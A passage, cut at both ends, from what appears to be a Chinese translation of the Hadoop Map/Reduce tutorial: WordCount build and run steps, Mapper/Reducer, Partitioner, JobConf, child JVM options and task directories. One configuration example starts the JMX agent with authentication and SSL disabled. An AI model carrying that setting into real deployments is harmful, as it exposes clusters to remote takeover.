class="hljs-keyword">new</span> JobConf(WordCount<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>; conf.setJobName(<span class="hljs-string">"wordcount"</span>); conf.setOutputKeyClass(Text<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>; conf.setOutputValueClass(IntWritable<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>; conf.setMapperClass(Map<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>; conf.setCombinerClass(Reduce<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>; conf.setReducerClass(Reduce<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>; conf.setInputFormat(TextInputFormat<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>; conf.setOutputFormat(TextOutputFormat<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>; FileInputFormat.setInputPaths(conf, <span class="hljs-keyword">new</span> Path(args[<span class="hljs-number">0</span>])); FileOutputFormat.setOutputPath(conf, <span class="hljs-keyword">new</span> Path(args[<span class="hljs-number">1</span>])); JobClient.runJob(conf);   }}</code></pre></div><p>假设环境变量HADOOP_HOME对应安装时的根目录，HADOOP_VERSION对应Hadoop的当前安装版本，编译WordCount.java来创建jar包，可如下操作：</p><p>$ mkdir wordcount_classes<br>$ javac -classpath ${HADOOP_HOME}/hadoop-${HADOOP_VERSION}-core.jar -d wordcount_classes WordCount.java<br>$ jar -cvf /usr/joe/wordcount.jar -C wordcount_classes/ .</p><p>假设：</p><ul><li>/usr/joe/wordcount/input - 是HDFS中的输入路径</li><li>/usr/joe/wordcount/output - 是HDFS中的输出路径</li></ul><p>用示例文本文件做为输入：</p><p>$ bin/hadoop dfs -ls /usr/joe/wordcount/input/<br>/usr/joe/wordcount/input/file01<br>/usr/joe/wordcount/input/file02</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/input/file01<br>Hello World Bye World</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/input/file02<br>Hello Hadoop Goodbye Hadoop</p><p>运行应用程序：</p><p>$ bin/hadoop jar /usr/joe/wordcount.jar org.myorg.WordCount /usr/joe/wordcount/input /usr/joe/wordcount/output</p><p>输出是：</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/output/part-00000<br>Bye 1<br>Goodbye 1<br>Hadoop 2<br>Hello 2<br>World 2</p><p>应用程序能够使用-files选项来指定一个由逗号分隔的路径列表，这些路径是task的当前工作目录。使用选项-libjars可以向map和reduce的classpath中添加jar包。使用-archives选项程序可以传递档案文件做为参数，这些档案文件会被解压并且在task的当前工作目录下会创建一个指向解压生成的目录的符号链接（以压缩包的名字命名）。 有关命令行选项的更多细节请参考 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/commands_manual.html" target="_blank" rel="noopener">Commands manual</a>。</p><p>使用-libjars和-files运行wordcount例子：<br>hadoop jar hadoop-examples.jar wordcount -files cachefile.txt -libjars mylib.jar input output</p><p>WordCount应用程序非常直截了当。</p><p>Mapper(14-26行)中的map方法(18-25行)通过指定的 TextInputFormat(49行)一次处理一行。然后，它通过StringTokenizer 以空格为分隔符将一行切分为若干tokens，之后，输出&lt; <word>, 1&gt; 形式的键值对。</word></p><p>对于示例中的第一个输入，map输出是：<br>&lt; Hello, 1&gt;<br>&lt; World, 1&gt;<br>&lt; Bye, 1&gt;<br>&lt; World, 1&gt;</p><p>第二个输入，map输出是：<br>&lt; Hello, 1&gt;<br>&lt; Hadoop, 1&gt;<br>&lt; Goodbye, 1&gt;<br>&lt; Hadoop, 1&gt;</p><p>关于组成一个指定作业的map数目的确定，以及如何以更精细的方式去控制这些map，我们将在教程的后续部分学习到更多的内容。</p><p>WordCount还指定了一个combiner (46行)。因此，每次map运行之后，会对输出按照<em>key</em>进行排序，然后把输出传递给本地的combiner（按照作业的配置与Reducer一样），进行本地聚合。</p><p>第一个map的输出是：<br>&lt; Bye, 1&gt;<br>&lt; Hello, 1&gt;<br>&lt; World, 2&gt;</p><p>第二个map的输出是：<br>&lt; Goodbye, 1&gt;<br>&lt; Hadoop, 2&gt;<br>&lt; Hello, 1&gt;</p><p>Reducer(28-36行)中的reduce方法(29-35行) 仅是将每个key（本例中就是单词）出现的次数求和。</p><p>因此这个作业的输出就是：<br>&lt; Bye, 1&gt;<br>&lt; Goodbye, 1&gt;<br>&lt; Hadoop, 2&gt;<br>&lt; Hello, 2&gt;<br>&lt; World, 2&gt;</p><p>代码中的run方法中指定了作业的几个方面， 例如：通过命令行传递过来的输入/输出路径、key/value的类型、输入/输出的格式等等JobConf中的配置信息。随后程序调用了JobClient.runJob(55行)来提交作业并且监控它的执行。</p><p>我们将在本教程的后续部分学习更多的关于JobConf， JobClient， Tool和其他接口及类(class)。</p><h2 id="Map-Reduce-用户界面"><a href="#Map-Reduce-用户界面" class="headerlink" title="Map/Reduce - 用户界面"></a>Map/Reduce - 用户界面</h2><p>这部分文档为用户将会面临的Map/Reduce框架中的各个环节提供了适当的细节。这应该会帮助用户更细粒度地去实现、配置和调优作业。然而，请注意每个类/接口的javadoc文档提供最全面的文档；本文只是想起到指南的作用。</p><p>我们会先看看Mapper和Reducer接口。应用程序通常会通过提供map和reduce方法来实现它们。</p><p>然后，我们会讨论其他的核心接口，其中包括： JobConf，JobClient，Partitioner， OutputCollector，Reporter， InputFormat，OutputFormat等等。</p><p>最后，我们将通过讨论框架中一些有用的功能点（例如：DistributedCache， IsolationRunner等等）来收尾。</p><p>应用程序通常会通过提供map和reduce来实现 Mapper和Reducer接口，它们组成作业的核心。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Mapper.html" target="_blank" rel="noopener">Mapper</a>将输入键值对(key/value pair)映射到一组中间格式的键值对集合。</p><p>Map是一类将输入记录集转换为中间格式记录集的独立任务。 这种转换的中间格式记录集不需要与输入记录集的类型一致。一个给定的输入键值对可以映射成0个或多个输出键值对。</p><p>Hadoop Map/Reduce框架为每一个InputSplit产生一个map任务，而每个InputSplit是由该作业的InputFormat产生的。</p><p>概括地说，对Mapper的实现者需要重写 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConfigurable.html#configure(org.apache.hadoop.mapred.JobConf)" target="_blank" rel="noopener">JobConfigurable.configure(JobConf)</a>方法，这个方法需要传递一个JobConf参数，目的是完成Mapper的初始化工作。然后，框架为这个任务的InputSplit中每个键值对调用一次 [map(WritableComparable, Writable, OutputCollector, Reporter)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Mapper.html#map" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Mapper.html#map</a>(K1, V1, org.apache.hadoop.mapred.OutputCollector, org.apache.hadoop.mapred.Reporter))操作。应用程序可以通过重写<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/io/Closeable.html#close()" target="_blank" rel="noopener">Closeable.close()</a>方法来执行相应的清理工作。</p><p>输出键值对不需要与输入键值对的类型一致。一个给定的输入键值对可以映射成0个或多个输出键值对。通过调用[ OutputCollector.collect(WritableComparable,Writable)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/OutputCollector.html#collect" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/OutputCollector.html#collect</a>(K, V))可以收集输出的键值对。</p><p>应用程序可以使用Reporter报告进度，设定应用级别的状态消息，更新Counters（计数器），或者仅是表明自己运行正常。</p><p>框架随后会把与一个特定key关联的所有中间过程的值（value）分成组，然后把它们传给Reducer以产出最终的结果。用户可以通过 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setOutputKeyComparatorClass(java.lang.Class)" target="_blank" rel="noopener">JobConf.setOutputKeyComparatorClass(Class)</a>来指定具体负责分组的 Comparator。</p><p>Mapper的输出被排序后，就被划分给每个Reducer。分块的总数目和一个作业的reduce任务的数目是一样的。用户可以通过实现自定义的 Partitioner来控制哪个key被分配给哪个 Reducer。</p><p>用户可选择通过<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setCombinerClass(java.lang.Class)" target="_blank" rel="noopener"> JobConf.setCombinerClass(Class)</a>指定一个combiner，它负责对中间过程的输出进行本地的聚集，这会有助于降低从Mapper到 Reducer数据传输量。</p><p>这些被排好序的中间过程的输出结果保存的格式是(key-len, key, value-len, value)，应用程序可以通过JobConf控制对这些中间结果是否进行压缩以及怎么压缩，使用哪种<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/io/compress/CompressionCodec.html" target="_blank" rel="noopener"> CompressionCodec</a>。</p><p>Map的数目通常是由输入数据的大小决定的，一般就是所有输入文件的总块（block）数。</p><p>Map正常的并行规模大致是每个节点（node）大约10到100个map，对于CPU 消耗较小的map任务可以设到300个左右。由于每个任务初始化需要一定的时间，因此，比较合理的情况是map执行的时间至少超过1分钟。</p><p>这样，如果你输入10TB的数据，每个块（block）的大小是128MB，你将需要大约82,000个map来完成任务，除非使用 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setNumMapTasks(int)" target="_blank" rel="noopener">setNumMapTasks(int)</a>（注意：这里仅仅是对框架进行了一个提示(hint)，实际决定因素见<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setNumMapTasks(int)" target="_blank" rel="noopener">这里</a>）将这个数值设置得更高。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reducer.html" target="_blank" rel="noopener">Reducer</a>将与一个key关联的一组中间数值集归约（reduce）为一个更小的数值集。</p><p>用户可以通过<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setNumReduceTasks(int)" target="_blank" rel="noopener"> JobConf.setNumReduceTasks(int)</a>设定一个作业中reduce任务的数目。</p><p>概括地说，对Reducer的实现者需要重写 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConfigurable.html#configure(org.apache.hadoop.mapred.JobConf)" target="_blank" rel="noopener">JobConfigurable.configure(JobConf)</a>方法，这个方法需要传递一个JobConf参数，目的是完成Reducer的初始化工作。然后，框架为成组的输入数据中的每个&lt;key, (list of values)&gt;对调用一次 [reduce(WritableComparable, Iterator, OutputCollector, Reporter)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reducer.html#reduce" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reducer.html#reduce</a>(K2, java.util.Iterator, org.apache.hadoop.mapred.OutputCollector, org.apache.hadoop.mapred.Reporter))方法。之后，应用程序可以通过重写<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/io/Closeable.html#close()" target="_blank" rel="noopener">Closeable.close()</a>来执行相应的清理工作。</p><p>Reducer有3个主要阶段：shuffle、sort和reduce。</p><p>Reducer的输入就是Mapper已经排好序的输出。在这个阶段，框架通过HTTP为每个Reducer获得所有Mapper输出中与之相关的分块。</p><p>这个阶段，框架将按照key的值对Reducer的输入进行分组 （因为不同mapper的输出中可能会有相同的key）。</p><p>Shuffle和Sort两个阶段是同时进行的；map的输出也是一边被取回一边被合并的。</p><p>如果需要中间过程对key的分组规则和reduce前对key的分组规则不同，那么可以通过<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setOutputValueGroupingComparator(java.lang.Class)" target="_blank" rel="noopener"> JobConf.setOutputValueGroupingComparator(Class)</a>来指定一个Comparator。再加上 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setOutputKeyComparatorClass(java.lang.Class)" target="_blank" rel="noopener">JobConf.setOutputKeyComparatorClass(Class)</a>可用于控制中间过程的key如何被分组，所以结合两者可以实现<em>按值的二次排序</em>。</p><p>在这个阶段，框架为已分组的输入数据中的每个 &lt;key, (list of values)&gt;对调用一次 [reduce(WritableComparable, Iterator, OutputCollector, Reporter)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reducer.html#reduce" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reducer.html#reduce</a>(K2, java.util.Iterator, org.apache.hadoop.mapred.OutputCollector, org.apache.hadoop.mapred.Reporter))方法。</p><p>Reduce任务的输出通常是通过调用 [OutputCollector.collect(WritableComparable, Writable)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/OutputCollector.html#collect" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/OutputCollector.html#collect</a>(K, V))写入 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/fs/FileSystem.html" target="_blank" rel="noopener">文件系统</a>的。</p><p>应用程序可以使用Reporter报告进度，设定应用程序级别的状态消息，更新Counters（计数器），或者仅是表明自己运行正常。</p><p>Reducer的输出是<em>没有排序的</em>。</p><p>Reduce的数目建议是0.95或1.75乘以 (&lt;<em>no. of nodes</em>&gt; * mapred.tasktracker.reduce.tasks.maximum)。</p><p>用0.95，所有reduce可以在maps一完成时就立刻启动，开始传输map的输出结果。用1.75，速度快的节点可以在完成第一轮reduce任务后，可以开始第二轮，这样可以得到比较好的负载均衡的效果。</p><p>增加reduce的数目会增加整个框架的开销，但可以改善负载均衡，降低由于执行失败带来的负面影响。</p><p>上述比例因子比整体数目稍小一些是为了给框架中的推测性任务（speculative-tasks） 或失败的任务预留一些reduce的资源。</p><p>如果没有归约要进行，那么设置reduce任务的数目为<em>零</em>是合法的。</p><p>这种情况下，map任务的输出会直接被写入由 [setOutputPath(Path)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#setOutputPath" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#setOutputPath</a>(org.apache.hadoop.mapred.JobConf, org.apache.hadoop.fs.Path))指定的输出路径。框架在把它们写入FileSystem之前没有对它们进行排序。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Partitioner.html" target="_blank" rel="noopener">Partitioner</a>用于划分键值空间（key space）。</p><p>Partitioner负责控制map输出结果key的分割。Key（或者一个key子集）被用于产生分区，通常使用的是Hash函数。分区的数目与一个作业的reduce任务的数目是一样的。因此，它控制将中间过程的key（也就是这条记录）应该发送给m个reduce任务中的哪一个来进行reduce操作。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/lib/HashPartitioner.html" target="_blank" rel="noopener">HashPartitioner</a>是默认的 Partitioner。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reporter.html" target="_blank" rel="noopener">Reporter</a>是用于Map/Reduce应用程序报告进度，设定应用级别的状态消息， 更新Counters（计数器）的机制。</p><p>Mapper和Reducer的实现可以利用Reporter 来报告进度，或者仅是表明自己运行正常。在那种应用程序需要花很长时间处理个别键值对的场景中，这种机制是很关键的，因为框架可能会以为这个任务超时了，从而将它强行杀死。另一个避免这种情况发生的方式是，将配置参数mapred.task.timeout设置为一个足够高的值（或者干脆设置为零，则没有超时限制了）。</p><p>应用程序可以用Reporter来更新Counter（计数器）。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/OutputCollector.html" target="_blank" rel="noopener">OutputCollector</a>是一个Map/Reduce框架提供的用于收集 Mapper或Reducer输出数据的通用机制 （包括中间输出结果和作业的输出结果）。</p><p>Hadoop Map/Reduce框架附带了一个包含许多实用型的mapper、reducer和partitioner 的<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/lib/package-summary.html" target="_blank" rel="noopener">类库</a>。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html" target="_blank" rel="noopener">JobConf</a>代表一个Map/Reduce作业的配置。</p><p>JobConf是用户向Hadoop框架描述一个Map/Reduce作业如何执行的主要接口。框架会按照JobConf描述的信息忠实地去尝试完成这个作业，然而：</p><ul><li>一些参数可能会被管理者标记为<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/conf/Configuration.html#FinalParams" target="_blank" rel="noopener"> final</a>，这意味它们不能被更改。</li><li>一些作业的参数可以被直截了当地进行设置（例如： <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setNumReduceTasks(int)" target="_blank" rel="noopener">setNumReduceTasks(int)</a>），而另一些参数则与框架或者作业的其他参数之间微妙地相互影响，并且设置起来比较复杂（例如：<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setNumMapTasks(int)" target="_blank" rel="noopener"> setNumMapTasks(int)</a>）。</li></ul><p>通常，JobConf会指明Mapper、Combiner(如果有的话)、 Partitioner、Reducer、InputFormat和 OutputFormat的具体实现。JobConf还能指定一组输入文件 ([setInputPaths(JobConf, Path…)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html#setInputPaths" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html#setInputPaths</a>(org.apache.hadoop.mapred.JobConf, org.apache.hadoop.fs.Path[])) /[addInputPath(JobConf, Path)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html#addInputPath" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html#addInputPath</a>(org.apache.hadoop.mapred.JobConf, org.apache.hadoop.fs.Path))) 和([setInputPaths(JobConf, String)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html#setInputPaths" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html#setInputPaths</a>(org.apache.hadoop.mapred.JobConf, java.lang.String)) /[addInputPaths(JobConf, String)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html#addInputPath" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html#addInputPath</a>(org.apache.hadoop.mapred.JobConf, java.lang.String))) 以及输出文件应该写在哪儿 ([setOutputPath(Path)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#setOutputPath" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#setOutputPath</a>(org.apache.hadoop.mapred.JobConf, org.apache.hadoop.fs.Path)))。</p><p>JobConf可选择地对作业设置一些高级选项，例如：设置Comparator； 放到DistributedCache上的文件；中间结果或者作业输出结果是否需要压缩以及怎么压缩； 利用用户提供的脚本(<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMapDebugScript(java.lang.String)" target="_blank" rel="noopener">setMapDebugScript(String)</a>/<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setReduceDebugScript(java.lang.String)" target="_blank" rel="noopener">setReduceDebugScript(String)</a>) 进行调试；作业是否允许<em>预防性（speculative）</em>任务的执行 (<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMapSpeculativeExecution(boolean)" target="_blank" rel="noopener">setMapSpeculativeExecution(boolean)</a>)/(<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setReduceSpeculativeExecution(boolean)" target="_blank" rel="noopener">setReduceSpeculativeExecution(boolean)</a>) ；每个任务最大的尝试次数 (<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMaxMapAttempts(int)" target="_blank" rel="noopener">setMaxMapAttempts(int)</a>/<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMaxReduceAttempts(int)" target="_blank" rel="noopener">setMaxReduceAttempts(int)</a>) ；一个作业能容忍的任务失败的百分比 (<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMaxMapTaskFailuresPercent(int)" target="_blank" rel="noopener">setMaxMapTaskFailuresPercent(int)</a>/<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMaxReduceTaskFailuresPercent(int)" target="_blank" rel="noopener">setMaxReduceTaskFailuresPercent(int)</a>) ；等等。</p><p>当然，用户能使用 [set(String, String)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/conf/Configuration.html#set" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/conf/Configuration.html#set</a>(java.lang.String, java.lang.String))/[get(String, String)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/conf/Configuration.html#get" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/conf/Configuration.html#get</a>(java.lang.String, java.lang.String)) 来设置或者取得应用程序需要的任意参数。然而，DistributedCache的使用是面向大规模只读数据的。</p><p>TaskTracker是在一个单独的jvm上以子进程的形式执行 Mapper/Reducer任务（Task）的。</p><p>子任务会继承父TaskTracker的环境。用户可以通过JobConf中的 mapred.child.java.opts配置参数来设定子jvm上的附加选项，例如： 通过-Djava.library.path=&lt;&gt; 将一个非标准路径设为运行时的链接用以搜索共享库，等等。如果mapred.child.java.opts包含一个符号<em>@taskid@</em>， 它会被替换成map/reduce的taskid的值。</p><p>下面是一个包含多个参数和替换的例子，其中包括：记录jvm GC日志； JVM JMX代理程序以无密码的方式启动，这样它就能连接到jconsole上，从而可以查看子进程的内存和线程，得到线程的dump；还把子jvm的最大堆尺寸设置为512MB， 并为子jvm的java.library.path添加了一个附加路径。</p><property> <name>mapred.child.java.opts</name> <value>   -Xmx512M -Djava.library.path=/home/mycompany/lib -verbose:gc -Xloggc:/tmp/@taskid@.gc   -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false </value></property><p>用户或管理员也可以使用mapred.child.ulimit设定运行的子任务的最大虚拟内存。mapred.child.ulimit的值以（KB)为单位，并且必须大于或等于-Xmx参数传给JavaVM的值，否则VM会无法启动。</p><p>注意：mapred.child.java.opts只用于设置task tracker启动的子任务。为守护进程设置内存选项请查看 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/cluster_setup.html#配置Hadoop守护进程的运行环境" target="_blank" rel="noopener">cluster_setup.html</a></p><p>${mapred.local.dir}/taskTracker/是task tracker的本地目录， 用于创建本地缓存和job。它可以指定多个目录（跨越多个磁盘），文件会半随机的保存到本地路径下的某个目录。当job启动时，task tracker根据配置文档创建本地job目录，目录结构如以下所示：</p><ul><li><p>${mapred.local.dir}/taskTracker/archive/ :分布式缓存。这个目录保存本地的分布式缓存。因此本地分布式缓存是在所有task和job间共享的。</p></li><li><p>${mapred.local.dir}/taskTracker/jobcache/$jobid/</p></li></ul><p>  : 本地job目录。</p><ul><li><p>${mapred.local.dir}/taskTracker/jobcache/$jobid/work/: job指定的共享目录。各个任务可以使用这个空间做为暂存空间，用于它们之间共享文件。这个目录通过job.local.dir 参数暴露给用户。这个路径可以通过API <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#getJobLocalDir()" target="_blank" rel="noopener">JobConf.getJobLocalDir()</a>来访问。它也可以被做为系统属性获得。因此，用户（比如运行streaming）可以调用System.getProperty(“job.local.dir”)获得该目录。</p></li><li><p>${mapred.local.dir}/taskTracker/jobcache/$jobid/jars/: 存放jar包的路径，用于存放作业的jar文件和展开的jar。job.jar是应用程序的jar文件，它会被自动分发到各台机器，在task启动前会被自动展开。使用api <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#getJar()" target="_blank" rel="noopener">JobConf.getJar() </a>函数可以得到job.jar的位置。使用JobConf.getJar().getParent()可以访问存放展开的jar包的目录。</p></li><li><p>${mapred.local.dir}/taskTracker/jobcache/$jobid/job.xml： 一个job.xml文件，本地的通用的作业配置文件。</p></li><li><p>${mapred.local.dir}/taskTracker/jobcache/$jobid/$taskid</p><p>： 每个任务有一个目录</p><p>task-id</p><p>，它里面有如下的目录结构：</p><ul><li>${mapred.local.dir}/taskTracker/jobcache/$jobid/$taskid/job.xml： 一个job.xml文件，本地化的任务作业配置文件。任务本地化是指为该task设定特定的属性值。这些值会在下面具体说明。</li><li>${mapred.local.dir}/taskTracker/jobcache/$jobid/$taskid/output 一个存放中间过程的输出文件的目录。它保存了由framwork产生的临时map reduce数据，比如map的输出文件等。</li><li>${mapred.local.dir}/taskTracker/jobcache/$jobid/$taskid/work： task的当前工作目录。</li><li>${mapred.local.dir}/taskTracker/jobcache/$jobid/$taskid/work/tmp： task的临时目录。（用户可以设定属性mapred.child.tmp 来为map和reduce task设定临时目录。缺省值是./tmp。如果这个值不是绝对路径， 它会把task的工作路径加到该路径前面作为task的临时文件路径。如果这个值是绝对路径则直接使用这个值。 如果指定的目录不存在，会自动创建该目录。之后，按照选项 -Djava.io.tmpdir=’临时文件的绝对路径’执行java子任务。 pipes和streaming的临时文件路径是通过环境变量TMPDIR=’the absolute path of the tmp dir’设定的）。 如果mapred.child.tmp有./tmp值，这个目录会被创建。</li></ul></li></ul><p>下面的属性是为每个task执行时使用的本地参数，它们保存在本地化的任务作业配置文件里：</p><table><thead><tr><th align="center">名称</th><th align="center">类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">mapred.job.id</td><td align="center">String</td><td align="center">job id</td></tr><tr><td align="center">mapred.jar</td><td align="center">String</td><td align="center">job目录下job.jar的位置</td></tr><tr><td align="center">job.local.dir</td><td align="center">String</td><td align="center">job指定的共享存储空间</td></tr><tr><td align="center">mapred.tip.id</td><td align="center">String</td><td align="center">task id</td></tr><tr><td align="center">mapred.task.id</td><td align="center">String</td><td align="center">task尝试id</td></tr><tr><td align="center">mapred.task.is.map</td><td align="center">boolean</td><td align="center">是否是map task</td></tr><tr><td align="center">mapred.task.partition</td><td align="center">int</td><td align="center">task在job中的id</td></tr><tr><td align="center">map.input.file</td><td align="center">String</td><td align="center">map读取的文件名</td></tr><tr><td align="center">map.input.start</td><td align="center">long</td><td align="center">map输入的数据块的起始位置偏移</td></tr><tr><td align="center">map.input.length</td><td align="center">long</td><td align="center">map输入的数据块的字节数</td></tr><tr><td align="center">mapred.work.output.dir</td><td align="center">String</td><td align="center">task临时输出目录</td></tr></tbody></table><p>task的标准输出和错误输出流会被读到TaskTracker中，并且记录到 ${HADOOP_LOG_DIR}/userlogs</p><p><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#DistributedCache" target="_blank" rel="noopener">DistributedCache</a> 可用于map或reduce task中分发jar包和本地库。子jvm总是把 <em>当前工作目录</em> 加到 java.library.path 和 LD_LIBRARY_PATH。 因此，可以通过 <a href="http://java.sun.com/j2se/1.5.0/docs/api/java/lang/System.html#loadLibrary(java.lang.String)" target="_blank" rel="noopener">System.loadLibrary</a>或 <a href="http://java.sun.com/j2se/1.5.0/docs/api/java/lang/System.html#load(java.lang.String)" target="_blank" rel="noopener">System.load</a>装载缓存的库。有关使用分布式缓存加载共享库的细节请参考 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/native_libraries.html#使用DistributedCache+加载本地库" target="_blank" rel="noopener">native_libraries.html</a></p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobClient.html" target="_blank" rel="noopener">JobClient</a>是用户提交的作业与JobTracker交互的主要接口。</p><p>JobClient 提供提交作业，追踪进程，访问子任务的日志记录，获得Map/Reduce集群状态信息等功能。</p><p>作业提交过程包括：</p><ol><li>检查作业输入输出样式细节</li><li>为作业计算InputSplit值。</li><li>如果需要的话，为作业的DistributedCache建立必须的统计信息。</li><li>拷贝作业的jar包和配置文件到FileSystem上的Map/Reduce系统目录下。</li><li>提交作业到JobTracker并且监控它的状态。</li></ol><p>作业的历史文件记录到指定目录的”_logs/history/“子目录下。这个指定目录由hadoop.job.history.user.location设定，默认是作业输出的目录。因此默认情况下，文件会存放在mapred.output.dir/_logs/history目录下。用户可以设置hadoop.job.history.user.location为none来停止日志记录。</p><p>用户使用下面的命令可以看到在指定目录下的历史日志记录的摘要。<br>$ bin/hadoop job -history output-dir<br>这个命令会打印出作业的细节，以及失败的和被杀死的任务细节。<br>要查看有关作业的更多细节例如成功的任务、每个任务尝试的次数（task attempt）等，可以使用下面的命令<br>$ bin/hadoop job -history all output-dir</p><p>用户可以使用 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/OutputLogFilter.html" target="_blank" rel="noopener">OutputLogFilter</a> 从输出目录列表中筛选日志文件。</p><p>一般情况，用户利用JobConf创建应用程序并配置作业属性， 然后用 JobClient 